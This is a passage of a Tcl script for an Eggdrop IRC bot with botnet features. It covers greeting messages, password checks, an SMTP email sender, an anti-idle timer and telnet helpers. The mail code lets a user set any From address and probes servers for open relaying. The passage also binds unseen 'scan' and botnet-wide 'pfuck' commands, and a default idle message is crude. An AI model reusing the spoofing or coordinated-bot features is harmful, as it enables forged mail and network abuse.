    global onj_ver onj_type onj_part onj_list onj_jmsg onj_pmsg onj_kind
    set c [strl [bi $a 0]]
    set p [strl [bi $a 1]]
    if {$c == ""} {
	putcmdlog "\#$h\# onjoin"
	pb $i "Current [b]On-Join[b] System status -"
	pb $i "-------------------------------"
	pb $i "System Version  \t: [b]$onj_ver[b]"
	pb $i "On-Join type    \t: [b]$onj_type[b]"
	pb $i "Part messaging  \t: [b]$onj_part[b]"
	if {$onj_type == "list"} {
	    if {$onj_list != ""} {
		pb $i "On-Join chanlist\t: [b]$onj_list[b]"
	    } else {
		pb $i "On-Join chanlist\t: [b]empty :)[b]"
	    }
	} elseif {$onj_type == "all"} {
	    pb $i "On-Join chanlist\t: [b]all channels[b]"
	} else {
	    pb $i "On-Join chanlist\t: [b]empty :)[b]"
	}
	foreach n [array names onj_jmsg] {
	    pb $i "On-Join join-mex\t: ( [b]$n[b] ) : [b]$onj_jmsg($n)[b]"
	}
	foreach n [array names onj_pmsg] {
	    pb $i "On-Join part-mex\t: ( [b]$n[b] ) : [b]$onj_pmsg($n)[b]"
	}
	pb $i "Messaging type  \t: [b]$onj_kind[b]"
	pb $i "-------------------------------"
	pb $i "See '[b].help onjoin[b]' for details.. ;)"
	return 0
    }
    switch -exact -- $c {
	"ver" {
	    putcmdlog "\#$h\# onjoin ver"
	    pb $i "[b]On-Join[b] System version is : [b]$onj_ver[b]"
	}
	"help" {
	    dccsimul $i ".help onjoin"
	}
	"type" {
	    if {$p == ""} {
		putcmdlog "\#$h\# onjoin type"
		pb $i "On-Join System monitoring type is : [b]$onj_type[b]"
		if {[matchattr $h m]} {
		    pb $i "Use '.onjoin type [b]all[b] / [b]list[b] / [b]off[b]' to change.. ;)"
		}
		return 0
	    }
	    if {![matchattr $h m]} {
		pb $i "Sorry, only global masters can change that.."
		return 0
	    }
	    if {($p != "all") && ($p != "list") && ($p != "off")} {
		pb $i "Available options are : '.onjoin type [b]all[b] / [b]list[b] / [b]off[b]'"
		return 0
	    }
	    if {$p == $onj_type} {
		pb $i "On-Join System monitoring type is already '$onj_type' ! ;)"
		return 0
	    }
	    putcmdlog "\#$h\# onjoin type $p"
	    set onj_type $p
	    onj_save
	    if {$onj_type == "off"} {
		onj_stop
	    } else {
		onj_start
	    }
	    bl "On-Join System monitoring type set to '[b]$onj_type[b]' : requested by $h."
	    if {$onj_type == "list"} {
		pb $i "Now you can add/remove monitored channels with '.onjoin add <\#chan>' or '.onjoin rem <\#chan>' and"
		pb $i "modify channel messages with '.onjoin msg <\#chan> <newmsg>' .."
		pb $i "See '[b].help onjoin[b]' to know details about messages format and other ! ;)"
	    }
	}
	"part" {
	    if {$p == ""} {
		putcmdlog "\#$h\# onjoin part"
		pb $i "On-Join System part-messaging is : [b]$onj_part[b]"
		if {[matchattr $h m]} {
		    pb $i "Use '.onjoin part [b]on[b] / [b]off[b]' to change.. ;)"
		}
		return 0
	    }
	    if {$p != "on" && $p != "off"} {
		pb $i "Available options are : '.onjoin part [b]on[b] / [b]off[b]'"
		return 0
	    }
	    if {$p == $onj_part} {
		pb $i "On-Join System part-messaging is already '$onj_part' ! ;)"
		return 0
	    }
	    putcmdlog "\#$h\# onjoin part $p"
	    set onj_part $p
	    onj_save
	    if {$onj_type == "off"} {
		onj_stop
	    } else {
		onj_start
	    }
	    bl "On-Join System part-messaging set to '[b]$onj_part[b]' : requested by $h."
	}
	"add" {
	    if {$p == ""} {
		pb $i "You must specify the channel to add ! ;)"
		return 0
	    }
	    if {![validchan $p]} {
		pb $i "Sorry, I'm not monitoring channel $p.."
		return 0
	    }
	    if {![matchattr $h m|m $p]} {
		pb $i "Sorry, only $p's masters can change that.."
		return 0
	    }
	    if {$onj_type != "list"} {
		pb $i "This feature is available only in 'list' mode.."
		if {[matchattr $h m]} {
		    pb $i "Use '[b].onjoin type list[b]' first ! ;)"
		}
		return 0
	    }
	    if {[string match *$p* $onj_list]} {
		pb $i "I 'm already monitoring channel $p with On-Join System.."
		pb $i "Try '[b].onjoin list[b]' to have a list! ;)"
		return 0
	    }
	    putcmdlog "\#$h\# onjoin add $p"
	    lappend onj_list $p
	    onj_save
	    bl "Added channel $p to On-Join System chanlist : requested by $h."
	}
	"rem" {
	    if {$p == ""} {
		pb $i "You must specify the channel to remove ! ;)"
		return 0
	    }
	    if {![matchattr $h m]} {
		if {[validchan $p] && ![matchattr $h |m $p]} {
		    pb $i "Sorry, only $p's masters can change that.."
		    return 0
		}
	    }
	    if {$onj_type != "list"} {
		pb $i "This feature is available only in 'list' mode.."
		if {[matchattr $h m]} {
		    pb $i "Use '[b].onjoin type list[b]' first ! ;)"
		}
		return 0
	    }
	    if {![string match *$p* $onj_list]} {
		pb $i "I 'm not monitoring channel $p with On-Join System.."
		pb $i "Try '[b].onjoin list[b]' to have a list! ;)"
		return 0
	    }
	    putcmdlog "\#$h\# onjoin rem $p"
	    set list ""
	    foreach ch $onj_list {
		if {![string match *$p* $ch]} {
		    lappend list $ch
		}
	    }
	    set onj_list $list
	    onj_save
	    bl "Removed channel $p from On-Join System chanlist : requested by $h"
	}
	"list" {
	    putcmdlog "\#$h\# onjoin list"
	    if {$onj_type == "all"} {
		set what "all channels"
	    } elseif {$onj_type == "off"} {
		set what "nothing :)"
	    } elseif {$onj_type == "list"} {
		set what $onj_list
		if {$what == ""} {
		    set what "nothing :)"
		}
	    }
	    pb $i "On-Join System is monitoring : [b]$what[b]"
	}
	"kind" {
	    if {$p == ""} {
		putcmdlog "\#$h\# onjoin kind"
		pb $i "On-Join System messaging type is : [b]$onj_kind[b]"
		if {[matchattr $h m]} {
		    pb $i "Use '.onjoin kind [b]notice[b] / [b]message[b] to change.. ;)"
		}
		return 0
	    }
	    if {$p != "notice" && $p != "message"} {
		pb $i "Available options are : '.onjoin kind [b]notice[b] / [b]message[b]'"
		return 0
	    }
	    if {$p == $onj_kind} {
		pb $i "On-Join System messaging type is already '$onj_kind' ! ;)"
		return 0
	    }
	    putcmdlog "\#$h\# onjoin kind $p"
	    set onj_kind $p
	    onj_save
	    bl "On-Join System messaging type set to '[b]$onj_kind[b]' : requested by $h."
	}
	"jmsg" - "pmsg" {
	    if {$c == "jmsg"} {
		set wm "join-mex"
	    } else {
		set wm "part-mex"
	    }
	    if {$p == ""} {
		putcmdlog "\#$h\# onjoin $c"
		if {$c == "jmsg"} {
		    foreach n [array names onj_jmsg] {
			pb $i "On-Join $wm\t: ( [b]$n[b] ) : [b]$onj_jmsg($n)[b]"
		    }
		} else {
		    foreach n [array names onj_pmsg] {
			pb $i "On-Join $wm\t: ( [b]$n[b] ) : [b]$onj_pmsg($n)[b]"
		    }
		}
		return 0
	    }
	    set mex [lrange $a 2 end]
	    if {$p == "all"} {
		if {![matchattr $h m]} {
		    pb $i "Sorry, only global masters can change that.."
		    return 0
		}
		if {$mex == ""} {
		    pb $i "You can not remove the global message !"
		    if {[matchattr $h m]} {
			pb $i "Try '[b].onjoin type off[b]'.. ;)"
		    }
		    return 0
		}
		putcmdlog "\#$h\# onjoin $c all \[...\]"
		if {$c == "jmsg"} {
		    set onj_jmsg(all) $mex
		} else {
		    set onj_pmsg(all) $mex
		}
		onj_save
		bl "On-Join System global $wm set to : $mex : requested by $h."
	    } else {
		if {$onj_type == "off" || ($onj_type == "list" && ![string match *$p* $onj_list]) || ($onj_type == "all" && ![validchan $p])} {
		    pb $i "I 'm not monitoring channel $p with On-Join System.."
		    pb $i "Try '[b].onjoin list[b]' to have a list! ;)"
		    return 0
		}
		if {![matchattr $h m]} {
		    if {[validchan $p] && ![matchattr $h |m $p]} {
			pb $i "Sorry, only $p's masters can change that.."
			return 0
		    }
		}
		putcmdlog "\#$h\# onjoin $c $p \[...\]"
		if {$mex == ""} {
		    if {$c == "jmsg"} {
			if {[info exists onj_jmsg($p)]} {
			    unset onj_jmsg($p)
			    bl "Removed On-Join System $wm for channel $p : requested by $h."
			} else {
			    pb $i "There was no specific $wm for channel $p ! :)"
			}
		    } else {
			if {[info exists onj_pmsg($p)]} {
			    unset onj_pmsg($p)
			    bl "Removed On-Join System $wm for channel $p : requested by $h."
			} else {
			    pb $i "There was no specific $wm for channel $p ! :)"
			}
		    }
		} else {
		    if {$c == "jmsg"} {
			set onj_jmsg($p) $mex
		    } else {
			set onj_pmsg($p) $mex
		    }
		    bl "On-Join System $wm for channel $p set to : $mex : requested by $h."
		}
		onj_save
	    }
	}
	default {
	    pb $i "Unrecognized option.. Try '[b].help onjoin[b]' to get help ! ;)"
	}
    }
}

proc join_wellcome {n uh h c} {
    global onj_type onj_list onj_jmsg onj_kind
    if {[isbotnick $n] || [matchattr $h b]} {
	return 0
    }
    set c [strl $c]
    if {$onj_type == "list" && ![string match *$c* $onj_list]} {
	return 0
    }
    if {$onj_kind == "notice"} {
	set w "NOTICE"
    } else {
	set w "PRIVMSG"
    }
    if {[info exists onj_jmsg($c)]} {
	set m $onj_jmsg($c)
    } else {
	set m $onj_jmsg(all)
    }
    regsub -all "%nick" $m "$n" m
    regsub -all "%chan" $m "$c" m
    putquick "$w $n :$m"
}

proc part_seeyou {n uh h c {t ""}} {
    global onj_type onj_list onj_pmsg onj_kind
    if {[isbotnick $n] || [matchattr $h b]} {
	return 0
    }
    set c [strl $c]
    if {$onj_type == "list" && ![string match *$c* $onj_list]} {
	return 0
    }
    if {$onj_kind == "notice"} {
	set w "NOTICE"
    } else {
	set w "PRIVMSG"
    }
    if {[info exists onj_pmsg($c)]} {
	set m $onj_pmsg($c)
    } else {
	set m $onj_pmsg(all)
    }
    regsub -all "%nick" $m "$n" m
    regsub -all "%chan" $m "$c" m
    putquick "$w $n :$m"
}

proc join:checkpass {nick uhost h chan} {
    set ch [passwdok "$h" ""]
    if {[matchattr $h b]} { return 0 }
    if {$ch == "1"} {
	bl "$nick ($h) does not have a [b]password[b] set. Please notice him!!!"
    }
}

proc dcc:checkpass {h idx arg} {
    putcmdlog "#$h# checkpass"
    set users ""
    foreach user [userlist] {
	set ch [passwdok "$user" ""]
	if {$ch == "1" && ![matchattr $user b]} {
	    lappend users $user
	    pb $idx "$user has not yet set a password.. :("
	}
    }
    if {$users == ""} {
	pb $idx "All users have a password set ! ^_^"
    }
}

set globalflags "a c d f h j k m n o p q t u v w x B"
set chanflags   "a d f k m n o q v w"
set botflags    "b"
set customflags "A C D E F G H I J K L M N O P Q R S T U V W X Y Z"

proc dcc:flagnote {h i a} {
    global customflags globalflags chanflags botflags
    set w [bi $a 0]
    if {[string index [bi $a 1] 0] == "#"} {
	set tg 0 ; set tc 1 ; set c "[bi $a 1]"
	if {![validchan $c]} { pb $i "Sorry, I don't monitor $c.." ; return 0 }
	set m [br $a 2 end]
    } elseif {[strl [bi $a 1]] == "all"} {
	set tg 1 ; set tc 1 ; set c "[channels]" ; set m [br $a 2 end]
    } else {
	set tg 1 ; set tc 0 ; set c "" ; set m [br $a 1 end]
    }
    if {$w == "" || $m == ""} {
	pb $i "Usage : flagnote <flag> \[#channel or all\] <text>"
	pb $i "You may include %nick in the text to use the reciptients handle in your message" ; return 0
    }
    if {[string index $w 0] == "+"} { set w [string index $w 1] }
    if {[lsearch -exact $botflags $w] > 0} {
	pb $i "Error : flag [b]$w[b] is only for [b]bots[b].."
	pb $i "User-flags are : [b][lsort $globalflags][b]" ; return 0
    }
    if {[lsearch -exact [concat $globalflags $customflags] $w] < 0} {
	pb $i "Error : [b]$w[b] is not defined.. :("
	pb $i "User-flags are : [b][lsort $globalflags][b]" ; return 0
    }
    if {$tc && $tg} {
	putcmdlog "#$h# flagnote +$w all ..." ; pb $i "Sending note to all [b]$w[b] users.." ; set c [channels]
    } elseif {$tc && !$tg} {
	putcmdlog "#$h# flagnote +$w $c ..." ; pb $i "Sending note to all [b]$w[b] users for channel $c.."
    } else {
	putcmdlog "#$h# flagnote +$w ..." ; pb $i "Sending note to all global [b]$w[b] users.."
    }
    if {[lsearch -exact [concat $chanflags $customflags] $w] < 0 && $tc} {
	pb $i "Error : [b]$w[b] is a [b]global[b] only flag.. :(" ; pb $i "Try '.flagnote <flag> all ...'" ; return 0
    }
    set m "\[[b]$w[b]\] $m" ; set n 0 ; set bn 0 ; set bu ""
    foreach u [userlist] {
	if {![matchattr $u b] && $u != $h} {
	    if {[matchattr $u $w] && $tg} {
		regsub -all "%nick" $m "$u" t ; set ok [sendnote $h $u $t]
		if {$ok == 3 || $ok == 0} { incr bn ; lappend bu $u } else { incr n }
		continue
	    }
	    if {$tc} {
		foreach C $c {
		    if {[matchattr $u -|$w $C]} {
			regsub -all "%nick" $m "$u" t ; set ok [sendnote $h $u $t]
			if {$ok == 3 || $ok == 0} { incr bn ; lappend bu $u } else { incr n }
			break
		    }
		}
	    }
	}
    }
    if {$n == 1} {set n "1 note was"} else {set n "$n notes were"}
    pb $i "$n sent : ok ! ;D"
    if {$bn} {
	if {$bn == 1} {set bn "1 note was"} {set bn "$bn notes were"}
	pb $i "Error: $bn could not be delivered to: $bu.. :("
    }
}

proc validemail {e} {
    if {(![string match *@* $e]) || ([lindex [split $e @] 0] == "") || ([lindex [split $e @] 1] == "")} {
	return 0
    }
    return 1
}

proc dcc:mail {h idx arg} {
    global mail_addr mail_smtp
    if {[bi $arg 0] == ""} {
	pb $idx "Usage : .mail <email@host.domain>"
	return 0
    }
    set mail_addr($idx) [bi $arg 0]
    if {![validemail $mail_addr($idx)]} {
	pb $idx "Please, enter the [b]destination[b] email address in the format 'email@host.domain' .."
	unset mail_addr($idx)
    } else {
	set mail_smtp($idx) "mail.[lindex [split $mail_addr($idx) @] 1]"
	pb $idx "Please, enter [b]your[b] email address in the format 'email@host.domain' .."
    }
    putcmdlog "\#$h\# mail \[...\]"
    control $idx mail:edit
}

proc mail_sending {idx arg} {
    global mailsender_idx my_addr mail_addr mail_subject mail_msg bnick mail_send_step mail_smtp mail_done
    set i $mailsender_idx($idx)
    if {(![valididx $idx]) || ($arg == "")} {
	utimer 1 "putdcc $i \"\[boja\] - Sorry, could not connect to SMTP server '$mail_smtp($i)'..\""
	utimer 2 "putdcc $i \"\[boja\] - Try '[b].smtp <newSMTP>[b]' or '[b].smtp mail[b]' to change it !\""
	unset mailsender_idx($idx)
	return 1
    }
    if {![info exists mail_send_step($idx)]} {
	set mail_send_step($idx) "start"
	putdcc $idx "helo [myip]"
	return 0
    }
    set response [strl $arg]
    if {[string match "*not allow*" $response] || [string match "*denied*" $response] || [string match "*prohibi*" $response]} {
	utimer 1 "putdcc $i \"\[boja\] - Sorry, this SMTP server does [b]not[b] allow relaying..\""
	utimer 2 "putdcc $i \"\[boja\] - Try '[b].smtp <newSMTP>[b]' or '[b].smtp mail[b]' to change it !\""
	unset mailsender_idx($idx)
	return 1
    }
    putdcc $idx "mail from: <$my_addr($i)>"
    putdcc $idx "rcpt to: <$mail_addr($i)>"
    putdcc $idx "data"
    putdcc $idx "From: [idx2hand $i] <$my_addr($i)>"
    putdcc $idx "To: $mail_addr($i)"
    putdcc $idx "Subject: $mail_subject($i)"
    foreach mail_line $mail_msg($i) {
	putdcc $idx $mail_line
    }
    putdcc $idx " "
    putdcc $idx " "
    putdcc $idx "--=\{( E-mail sent from IRC-bot $bnick : thanks to [boja] ! ;D )\}=--"
    putdcc $idx ""
    putdcc $idx "."
    putdcc $idx "quit"
    utimer 1 "putdcc $i \"\[boja\] - Ok, email sent to $mail_addr($i) successfully! ;D\""
    utimer 2 "putdcc $i \"\[boja\] - Now type anything to rejoin the partyline..\""
    bl "E-Mail sent by [idx2hand $i].."
    unset my_addr($i)
    unset mail_addr($i)
    unset mail_subject($i)
    unset mail_msg($i)
    unset mail_smtp($i)
    unset mail_send_step($idx)
    unset mailsender_idx($idx)
    set mail_done($i) "yes"
    return 1
}

proc mail:edit {idx arg} {
    global my_addr mail_addr mail_subject mail_msg bnick mailsender_idx mail_smtp mail_done
    if {[info exists mail_done($idx)]} {
	unset mail_done($idx)
	utimer 1 "catch {dccsimul $idx \"$arg\"}"
	return 1
    }
    if {![info exists mail_addr($idx)]} {
	if {[validemail $arg]} {
	    set mail_addr($idx) $arg
	    set mail_smtp($idx) "mail.[lindex [split $mail_addr($idx) @] 1]"
	    pb $idx "Please, enter [b]your[b] email address in the format 'email@host.domain' .."
	    return 0
	} else {
	    pb $idx "Please, enter the [b]destination[b] email address in the format 'email@host.domain' .."
	    return 0
	}
    }
    if {![info exists my_addr($idx)]} {
	if {[validemail $arg]} {
	    set my_addr($idx) $arg
	    pb $idx "Please, enter the [b]subject[b] of your email .."
	    return 0
	} else {
	    pb $idx "Please, enter [b]your[b] email address in the format 'email@host.domain' .."
	    return 0
	}
    }
    set avail_cmd ".done, .quit, .read, .redo, .from, .to, .smtp, .help \[command\]"
    if {![info exists mail_subject($idx)]} {
	set mail_subject($idx) $arg
	set mail_msg($idx) ""
	pb $idx "Ok, now write your email-message. Available commands are :"
	pb $idx "[b]$avail_cmd[b]"
	return 0
    }
    if {([catch { set command [strl [lindex $arg 0]] }] != 0) || ([string index $arg 0] == "-")} {
	lappend mail_msg($idx) $arg
	return 0
    }
    set param [bi $arg 1]
    if {$command != ".help" && [bi $arg 2] != ""} {
	lappend mail_msg($idx) $arg
	return 0
    }
    switch -exact -- $command {
	".done" {
	    if {$mail_smtp($idx) == "mail"} {
		if {[catch {exec which mail}] != 0} {
		    pb $idx "Sorry, I can't find the 'mail' program.."
		    pb $idx "Try '[b].smtp <newSMTP>[b]' or '[b].smtp mail[b]' to change it !"
		    return 0
		}
		if {[catch {open smart.$bnick.mail.$idx w} fileid] == 0} {
		    puts $fileid " "
		    puts $fileid "From: [idx2hand $idx] <$my_addr($idx)>"
		    puts $fileid " "
		    puts $fileid "E-mail sent from IRC-bot $bnick as requested by [idx2hand $idx] ( $my_addr($idx) ) on [ctime [unixtime]] ( Thanks to [boja] )"
		    puts $fileid " "
		    foreach mail_line $mail_msg($idx) {
			puts $fileid $mail_line
		    }
		    close $fileid
		    if {[catch {exec mail $mail_addr($idx) -s "$mail_subject($idx)" < smart.$bnick.mail.$idx} mail_err] == 0} {
			utimer 3 "putdcc $idx \"\[boja\] - Ok, email sent to $mail_addr($idx) successfully! ;D\""
			utimer 3 "putlog \"\[boja\] - E-mail sent by [idx2hand $idx]..\""
			set sent_ok($idx) "yes"
		    } else {
			pb $idx "Sorry, error while trying to send your email via 'mail' program : $mail_err\""
			pb $idx "Available commands : $avail_cmd"
		    }
		    if {[catch {file delete -force smart.$bnick.mail.$idx}] != 0} {
			utimer 3 "putlog \"\[boja\] - Warning: Could not delete temp file 'smart.mail.$bnick.$idx' ! Please, remove it manually!\""
		    }
		    if {[info exists sent_ok($idx)]} {
			unset sent_ok($idx)
			unset my_addr($idx)
			unset mail_addr($idx)
			unset mail_subject($idx)
			unset mail_msg($idx)
			unset mail_smtp($idx)
			return 1
		    }
		} else {
		    pb $idx "Sorry, could not open temp file smart.$bnick.mail.$idx.. Mail not sent! :o("
		    pb $idx "Available commands : $avail_cmd"
		}
		return 0
	    }
	    if {[catch {set mailidx [connect $mail_smtp($idx) 25]}] != 0} {
		pb $idx "Sorry, could not connect to SMTP server '$mail_smtp($idx)'.."
		pb $idx "Try '[b].smtp <newSMTP>[b]' or '[b].smtp mail[b]' to change it !"
		return 0
	    }
	    set mailsender_idx($mailidx) $idx
	    control $mailidx mail_sending
	    return 0
	}
	".redo" {
	    pb $idx "Ok, removed text from email.. You can now rewrite it! ;)"
	    pb $idx "Available commands : $avail_cmd"
	    unset mail_msg($idx)
	    set mail_msg($idx) ""
	}
	".from" {
	    if {$param == ""} {
		pb $idx "Email From : [b]$my_addr($idx)[b]"
		pb $idx "Use '.from <youremail@yourhost.yourdomain>' to change.."
		return 0
	    } else {
		if {![validemail $param]} {
		    pb $idx "Please, enter your email address in the format '[b]email@host.domain[b]' .."
		} else {
		    set my_addr($idx) $param
		    pb $idx "Ok, your email address set to : [b]$my_addr($idx)[b]"
		}
		pb $idx "Available commands : $avail_cmd"
	    }
	}
	".to" {
	    if {$param == ""} {
		pb $idx "Email To : [b]$mail_addr($idx)[b]"
		pb $idx "Use '.to <email@host.domain>' to change.."
		return 0
	    } else {
		if {![validemail $param]} {
		    pb $idx "Please, enter destination email address in the format '[b]email@host.domain[b]' .."
		} else {
		    set mail_addr($idx) $param
		    pb $idx "Ok, destination email address set to : [b]$mail_addr($idx)[b]"
		}
		pb $idx "Available commands : $avail_cmd"
	    }
	}
	".quit" {
	    utimer 3 "putdcc $idx \"\[boja\] - Ok, email ignored.. ;)\""
	    utimer 3 "putlog \"\[boja\] - E-Mail by [p_test [idx2hand $idx]] NON sent ( quitted )..\""
	    unset my_addr($idx)
	    unset mail_addr($idx)
	    unset mail_subject($idx)
	    unset mail_msg($idx)
	    unset mail_smtp($idx)
	    return 1
	}
	".read" {
	    pb $idx "Email From\t: [b]$my_addr($idx)[b]"
	    pb $idx "Email To  \t: [b]$mail_addr($idx)[b]"
	    pb $idx "Subject   \t: [b]$mail_subject($idx)[b]"
	    pb $idx "Using SMTP\t: [b]$mail_smtp($idx)[b]"
	    putdcc $idx "--------- Your E-Mail Text ---------"
	    foreach mail_line $mail_msg($idx) {
		putdcc $idx "[b]$mail_line[b]"
	    }
	    putdcc $idx "---------------- End ---------------"
	    pb $idx "Available commands : $avail_cmd"
	}
	".smtp" {
	    if {$param == ""} {
		pb $idx "Trying to use SMTP server : [b]$mail_smtp($idx)[b]"
		pb $idx "Use '.smtp <newSMTP>' or '.smtp mail' to change.."
		return 0
	    } else {
		set mail_smtp($idx) $param
		pb $idx "SMTP server set to : [b]$mail_smtp($idx)[b]"
		pb $idx "Available commands : $avail_cmd"
	    }
	}
	".help" {
	    switch -exact -- [strl $param] {
		"read" {
		    pb $idx "Lets you read your message before sending it.. ( helpfull to check it )"
		}
		"done" {
		    pb $idx "Lets you send your message and then rejoin the party-line"
		}
		"redo" {
		    pb $idx "Lets you delete your message and re-write it.."
		}
		"quit" {
		    pb $idx "Lets you leave email-system and return to partyline without sending the message"
		}
		"smtp" {
		    pb $idx "Lets you select the appropriate SMTP server to send the email."
		    pb $idx "You can type '.smtp [b]mail[b]' to send your email via the"
		    pb $idx "standard shell-program 'mail'.."
		}
		"from" {
		    pb $idx "Lets you set your email address"
		}
		"to" {
		    pb $idx "Lets you set destination email address"
		}
		default {
		    pb $idx "Available commands : [b]$avail_cmd[b]"
		}
	    }
	}
	default {
	    lappend mail_msg($idx) $arg
	}
    }
}

al init "DCC binds loaded and ready !"

####################
# Anti-Idle System #
####################

bind dcc n idle dcc:idle

set idle_module_conf "$wpref.idle"
set idle_timer 30
set idle_msg "I need pussy... :o)"
set idle_enabled "1"
set idle_type "priv"

proc idle_save {} {
    global idle_module_conf idle_timer idle_msg idle_enabled idle_type
    set fileid [open $idle_module_conf w]
    puts $fileid "set idle_timer $idle_timer"
    puts $fileid "set idle_msg \"$idle_msg\""
    puts $fileid "set idle_enabled \"$idle_enabled\""
    puts $fileid "set idle_type \"$idle_type\""
    puts $fileid "al init \"Anti-Idle IRC-Ops protection conf loaded!\""
    close $fileid
}

if {![file exist $idle_module_conf]} {
    al init "Anti-Idle : Config file not found .. creating new one with defaults..."
    idle_save
}

source $idle_module_conf

foreach t [timers] {
    if {[string match "*antiidle*" [lindex $t 1]]} {
	killtimer [lindex $t 2]
    }
}

if {$idle_enabled == "1"} {
    global idle_msg idle_timer
    timer $idle_timer antiidle
}

proc antiidle {} {
    global botnick idle_msg idle_timer idle_enabled idle_type
    if { $idle_enabled != "1" } { return 0 }
    if {$idle_type == "priv"} {
	putserv "PRIVMSG $botnick :$idle_msg"
    } elseif {$idle_type == "public"} {
	set i 1
	foreach ch [channels] {
	    utimer $i "putserv \"PRIVMSG $ch :[p_test $idle_msg]\""
	    incr i
	}
    }
    timer $idle_timer antiidle
}

proc dcc:idle {h idx arg} {
    global idle_module_conf idle_enabled idle_timer idle_msg idle_type
    set idle [bi $arg 0]
    putcmdlog "\#$h\# idle [lrange $arg 0 end]"
    if {$idle == ""} {
	pb $idx "Anti-Idle IRC-Op protection system status :"
	putdcc $idx "[boja]-----------------------------------"
	putdcc $idx "[boja] [b]*[b]  Anti-Idle message\t: $idle_msg"
	putdcc $idx "[boja] [b]*[b]  Anti-idle timer\t: $idle_timer"
	if {$idle_type == "priv"} {
	    putdcc $idx "[boja] [b]*[b]  Anti-Idle type\t: private message"
	} elseif {$idle_type == "public"} {
	    putdcc $idx "[boja] [b]*[b]  Anti-Idle type\t: public message"
	}
	if {$idle_enabled == "1"} {
	    putdcc $idx "[boja] [b]*[b]  Anti-idle status\t: enabled."
	} else {
	    putdcc $idx "[boja] [b]*[b]  Anti-idle status\t: disabled."
	}
	putdcc $idx "[boja]-----------------------------------"
	pb $idx "Try .help idle to know more ... ;)"
	return 0
    }
    switch -exact -- $idle {
	"on" {
	    if {$idle_enabled == "1"} {
		pb $idx "Anti-idle IRC-Op protection is already enabled! ;)"
		return 0
	    }
	    set idle_enabled "1"
	    antiidle
	    idle_save
	    bl "Anti-Idle IRC-Op protection system enabled : Authorized by $h."
	}
	"off" {
	    set idle_enabled "0"
	    foreach t [timers] {
		if {[lindex $t 1] == "antiidle"} {
		    killtimer [lindex $t 2]
		}
	    }
	    idle_save
	    bl "Anti-Idle IRC-Op protection system disabled : Authorized by $h."
	}
	"public" {
	    set idle_type "public"
	    idle_save
	    bl "Anti-Idle IRC-Op protection message type set to '$idle_type' : Authorized by $h."
	}
	"priv" {
	    set idle_type "priv"
	    idle_save
	    bl "Anti-Idle IRC-Op protection message type set to '$idle_type' : Authorized by $h."
	}
	"time" {
	    set newtime [bi $arg 1]
	    if {$newtime == "" || [string trim $newtime "0123456789"] != ""} {
		pb $idx "Current Anti-Idle time is $idle_timer minutes."
		pb $idx "Specify a numeric value (\#minutes) to change.."
		return 0
	    }
	    set newtime [expr $newtime]
	    set idle_timer $newtime
	    idle_save
	    bl "Anti-Idle IRC-Op protection timer set to '$idle_timer' : Authorized by $h."
	}
	"msg" {
	    set newmsg [lrange $arg 1 end]
	    if {$newmsg == ""} {
		pb $idx "Current Anti-Idle message is : $idle_msg."
		pb $idx "Specify a new message to change.."
	    } else {
		set idle_msg $newmsg
		idle_save
		bl "Anti-Idle IRC-Op protection message set to : '$idle_msg' : Authorized by $h."
	    }
	}
	"help" {
	    dccsimul $idx ".help idle"
	}
	default {
	    pb $idx "I can't recognize this option.. Try .help idle! ;)"
	}
    }
}

# Helpfull SMART-commands

bind dcc m|m last dcc:last
bind dcc m telnet dcc:telnet
bind dcc m botctcp dcc:botctcp
bind bot - botctcp recv_botctcp
bind dcc t botping dcc:botping
bind bot - botping recv_botping
bind bot - botpingreturn bot_botpingreturn
bind dcc m scan dcc:scan
bind dcc m pfuck dcc:pfuck
bind bot - pfuck recv_pfuck
bind bot - stop_pfuck recv_stop_pfuck

proc dcc:last {h i a} {
    global bnick
    set n [bi $a 0]
    if {$n == ""} {
	set n 20
    } else {
	if {[string trim $n "0123456789"] != ""} {
	    pb $i "Usage: .last \[commands\#\]" ; return 0
	}
    }
    set n [expr $n]
    putcmdlog "\#$h\# last $n"
    foreach log [logfile] {
	if {[string match *[strl $bnick]* [strl $log]] && [string match *c* [bi $log 0]]} { break }
    }
    set last ""
    logfile "" [lindex $log 1] [lindex $log 2]
    set fd [file_try [lindex $log 2] r]
    if {$fd == 0} {
	pb $i "Sorry, I can't open logfile [lindex $log 2].."
    } else {
	while {![eof $fd]} {
	    set last_cmd [gets $fd]
	    if {[eof $fd]} { break }
	    if {[string match "*\#*\#*" $last_cmd]} { lappend last $last_cmd }
	}
	close $fd
    }
    logfile [lindex $log 0] [lindex $log 1] [lindex $log 2]
    set l [llength $last]
    if {$l > $n} { set start [expr $l - $n] } else {
	set oldlast ""
	set fd [file_try [lindex $log 2].yesterday r]
	if {$fd == 0} {
	    pb $i "Sorry, I can't open yesterday logfile [lindex $log 2].yesterday .."
	} else {
	    while {![eof $fd]} {
		set l_c [gets $fd]
		if {[eof $fd]} { break }
		if {[string match "*\#*\#*" $l_c]} { lappend oldlast $l_c }
	    }
	    close $fd
	}
	set last "$oldlast $last"
    }
    set l [llength $last]
    if {$l > $n} { set start [expr $l - $n] } else { set start 0 } ; set j $start
    pb $i "Last [expr $l - $start] commands received by $bnick are :"
    while {$j < $l} {
	if {$j == $start} {
	    set q "oldest \t"
	} elseif {$j == [expr $l - 1]} {
	    set q "newest \t"
	} else {
	    set q "-[expr $l - $j - 1] \t"
	}
	putdcc $i "$q \t [lindex $last $j]" ; incr j
    }
    pb $i "---------------------------------"
}

proc telnet_send {i a} {
	global telnet
	if {![info exists telnet($i)] || $a == "" || $a == ".telnetquit"} {
		if {$a == "" || $a == ".telnetquit"} {
			if {[info exists telnet($i)]} {
				if [validsocket $telnet($i)] {
					dosocket close $telnet($i)
				}
				unset telnet($i)
			}
		}
		utimer 3 "pb $i \"Telnet connection closed.\""
		return 1
	}
	puts $telnet($i) $a
	if {[eof $telnet($i)] || ![validsocket $telnet($i)]} {
		telnet_send $i ""
		return 1
	}
	if {![dosocket flush $telnet($i)]} { return 1 }
}

proc telnet_recv {i s} {
	proc t_end {i s} {
		global telnet
		dosocket close $s
		if {[info exists telnet($i)]} { unset telnet($i) }
	}
	if {![validsocket $s] || [eof $s]} { t_end $i $s; return 1 }
	set t [sgets $s]
	if {![validsocket $s] || [eof $s]} { t_end $i $s; return 1 }
	if {[valididx $i]} { putdcc $i $t }
}

proc sgets s {
	global errorInfo
	if {[info exists errorInfo] && $errorInfo != ""} {
		set o $errorInfo
	}
	catch {set t [gets $s]} e
	if {![info exists t]} {
		if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
		return "[boja] - $e"
	}
	return $t
}

proc dosocket {w s} {
    global errorInfo
